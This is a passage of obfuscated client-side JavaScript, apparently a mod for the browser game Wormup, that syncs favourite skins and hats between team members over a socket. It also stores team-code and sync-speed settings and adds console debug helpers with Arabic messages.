      localStorage.setItem("SaveGamewup", JSON.stringify(window.vps));
      if (_0x4e6d40()) {
        const _0x315e2b = _0x507127();
        if (_0x315e2b > 0) {
          setTimeout(() => {
            _0x256514("hat", _0x4ec950);
          }, _0x315e2b);
        } else {
          _0x256514("hat", _0x4ec950);
        }
      }
    }
  }
  function _0x2a81a9() {
    $(document).off("keydown.wormupSync");
    $(document).on("keydown.wormupSync", function (_0x56395e) {
      if (_0x56395e.target.tagName === "INPUT" || _0x56395e.target.tagName === "TEXTAREA") {
        return;
      }
      if (_0x56395e.keyCode === 49 || _0x56395e.which === 49) {
        _0x56395e.preventDefault();
        _0x4aee95();
      }
      if (_0x56395e.keyCode === 50 || _0x56395e.which === 50) {
        _0x56395e.preventDefault();
        _0x48aaf2();
      }
    });
  }
  window.addEventListener("teamCodeChanged", function (_0x4fdf32) {
    const _0x946013 = _0x4fdf32.detail.teamCode;
    _0x3b8d7b.serviceDisabled = false;
    _0x3b8d7b.reconnectAttempts = 0;
    _0x3b8d7b.reconnectDelay = 5000;
    _0x500392.registrationAttempts = 0;
    window._fixedTeamCode = null;
    if (_0x3b8d7b.socket && _0x3b8d7b.isConnected) {
      _0x3b8d7b.socket.disconnect();
    }
    setTimeout(() => {
      if (_0x4e6d40()) {
        _0x29b79b();
      }
    }, 1000);
  });
  window.addEventListener("speedSettingsChanged", function (_0x41e09b) {});
  async function _0xb27c91() {
    if (!_0x5d3582()) {
      setTimeout(_0xb27c91, 2000);
      return;
    }
    if (!window.vps) {
      window.vps = {};
    }
    if (!window.vps.favoriteSkins) {
      window.vps.favoriteSkins = [];
    }
    if (!window.vps.selectedHats) {
      window.vps.selectedHats = [];
    }
    await _0x41515d();
    _0x2a81a9();
    if (_0x4e6d40()) {
      _0x29b79b();
    } else {}
    window.toggleFavoriteSkin = _0x4aee95;
    window.toggleFavoriteHat = _0x48aaf2;
    window.playerSync = {
      getStatus: () => ({
        registration: _0x500392,
        connection: _0x3b8d7b,
        queueLength: _0x11a734.length,
        teamCode: _0xe9d896(),
        isServiceAvailable: _0x4e6d40(),
        userId: _0x194e5b()?.wuid,
        speedSettings: {
          changeSpeed: _0x507127(),
          receiveDelay: _0x47dea6()
        }
      }),
      forceRegister: () => {
        if (_0x4e6d40() && _0x3b8d7b.socket) {
          const _0x1f835a = _0x194e5b();
          const _0xe773b3 = _0x1d62fb();
          const _0xd2a47e = _0xe9d896();
          if (_0x1f835a && _0xe773b3 && _0xd2a47e && _0x1f835a.wuid) {
            _0x500392.isRegistered = false;
            _0x3b8d7b.joinedRoom = false;
            _0x500392.registrationAttempts = 0;
            _0x2f965c(_0x3b8d7b.socket, _0x1f835a, _0xe773b3, _0xd2a47e);
          }
        }
      },
      processQueue: _0x28ea8d,
      enableService: () => {
        _0x3b8d7b.serviceDisabled = false;
        _0x3b8d7b.reconnectAttempts = 0;
        _0x3b8d7b.reconnectDelay = 5000;
        _0x500392.registrationAttempts = 0;
        window._fixedTeamCode = null;
        if (_0x4e6d40()) {
          _0x29b79b();
        }
      },
      forceDisconnect: () => {
        if (_0x3b8d7b.socket) {
          _0x3b8d7b.serviceDisabled = true;
          _0x3b8d7b.socket.disconnect();
        }
      },
      resetConnection: () => {
        _0x3b8d7b.reconnectAttempts = 0;
        _0x3b8d7b.reconnectDelay = 5000;
        _0x3b8d7b.serviceDisabled = false;
        _0x3b8d7b.isReconnecting = false;
      },
      testSpeed: (_0x350277 = "skin", _0x38d67a = 999) => {
        const _0x1a484c = _0x507127();
        const _0x5292 = _0x47dea6();
        if (_0x4e6d40()) {
          _0x256514(_0x350277, _0x38d67a);
        } else {
          console.log("❌ الخدمة غير متاحة للاختبار");
        }
        return {
          changeSpeed: _0x1a484c,
          receiveDelay: _0x5292,
          servicAvailable: _0x4e6d40()
        };
      }
    };
    const _0x11dae5 = _0x194e5b();
    const _0x2997e2 = _0xe9d896();
    if (!_0x4e6d40()) {}
  }
  setTimeout(_0xb27c91, 1000);
})();
window.testPlayerSync = function () {
  const _0x9682f7 = window.playerSync?.getStatus();
  console.log("📊 حالة النظام:", {
    isServiceAvailable: _0x9682f7?.isServiceAvailable,
    isRegistered: _0x9682f7?.registration?.isRegistered,
    isConnected: _0x9682f7?.connection?.isConnected,
    teamCode: _0x9682f7?.teamCode,
    userId: _0x9682f7?.userId,
    queueLength: _0x9682f7?.queueLength,
    reconnectAttempts: _0x9682f7?.connection?.reconnectAttempts,
    maxReconnectAttempts: _0x9682f7?.connection?.maxReconnectAttempts,
    speedSettings: _0x9682f7?.speedSettings
  });
  return _0x9682f7;
};
window.testSpeed = function () {
  if (window.playerSync && window.playerSync.testSpeed) {
    return window.playerSync.testSpeed();
  }
  console.error("❌ نظام المزامنة غير متاح");
  return null;
};
window.setTeamCode = function (_0x1aecaf) {
  if (!_0x1aecaf || _0x1aecaf.trim().length < 2) {
    console.error("❌ كود الفريق يجب أن يكون على الأقل حرفين");
    return false;
  }
  const _0x5671a5 = _0x1aecaf.trim();
  localStorage.setItem("wormup_team_code", _0x5671a5);
  if (window.vps) {
    window.vps.teamCode = _0x5671a5;
  }
  window.dispatchEvent(new CustomEvent("teamCodeChanged", {
    detail: {
      teamCode: _0x5671a5
    }
  }));
  return true;
};
window.setTestSpeed = function (_0x1ace9b = 1000, _0x116797 = 500) {
  try {
    let _0x213e00 = {};
    try {
      _0x213e00 = JSON.parse(localStorage.getItem("SaveGamewup") || "{}");
    } catch (_0x297047) {
      _0x213e00 = {};
    }
    if (!_0x213e00.syncSettings) {
      _0x213e00.syncSettings = {};
    }
    _0x213e00.syncSettings.changeSpeed = parseInt(_0x1ace9b);
    _0x213e00.syncSettings.receiveDelay = parseInt(_0x116797);
    localStorage.setItem("SaveGamewup", JSON.stringify(_0x213e00));
    if (window.vps) {
      if (!window.vps.syncSettings) {
        window.vps.syncSettings = {};
      }
      window.vps.syncSettings.changeSpeed = parseInt(_0x1ace9b);
      window.vps.syncSettings.receiveDelay = parseInt(_0x116797);
    }
    window.dispatchEvent(new CustomEvent("speedSettingsChanged", {
      detail: {
        changeSpeed: _0x1ace9b,
        receiveDelay: _0x116797
      }
    }));
    return true;
  } catch (_0x1ff565) {
    console.error("❌ خطأ في تعيين السرعة:", _0x1ff565);
    return false;
  }
};
window.resetSpeed = function () {
  return window.setTestSpeed(0, 0);
};
const originalWarn = console.warn;
console.warn = function (..._0x407ea7) {
  const _0xa5152a = _0x407ea7.join(" ");
  const _0x520415 = ["[Violation]", "Permissions-Policy", "requestAnimationFrame", "deprecated", "gsi/web/guides/gis-migration"];
  if (_0x520415.some(_0x130e63 => _0xa5152a.includes(_0x130e63))) {
    return;
  }
  originalWarn.apply(console, _0x407ea7);
};
